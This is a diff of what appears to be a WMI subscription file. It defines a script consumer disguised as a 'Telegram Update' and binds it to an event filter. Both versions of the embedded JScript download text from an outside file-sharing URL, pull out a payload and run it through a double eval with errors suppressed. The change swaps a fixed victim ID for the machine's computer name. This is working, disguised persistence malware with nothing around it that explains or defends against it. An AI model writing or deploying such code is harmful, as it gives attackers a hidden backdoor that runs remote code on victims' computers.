@@ -12,7 +12,7 @@
     {
         Name = "Telegram Update";
         ScriptingEngine = "JScript";
-        ScriptText = "n='CPU-25-06-03445';h=new ActiveXObject('WinHttp.WinHttpRequest.5.1');try{h.open('GET','https://jumpshare.com/view/load/7Hp5dB7LsQhZMvmfVYVn',false);h.SetRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36');h.send();eval(eval(h.ResponseText.match(/<pre>(\\S*)<\\/pre>/)[1].replace(/&#039;/g,'\\\'').replace(/&quot;/g,'\"')));}catch(e){}";
+        ScriptText = "var network = new ActiveXObject('WScript.Network');n=network.ComputerName;h=new ActiveXObject('WinHttp.WinHttpRequest.5.1');try{h.open('GET','https://jumpshare.com/view/load/7Hp5dB7LsQhZMvmfVYVn',false);h.SetRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36');h.send();eval(eval(h.ResponseText.match(/<pre>(\\S*)<\\/pre>/)[1].replace(/&#039;/g,'\\\'').replace(/&quot;/g,'\"')));}catch(e){}";
     };
     instance of __FilterToConsumerBinding
     {
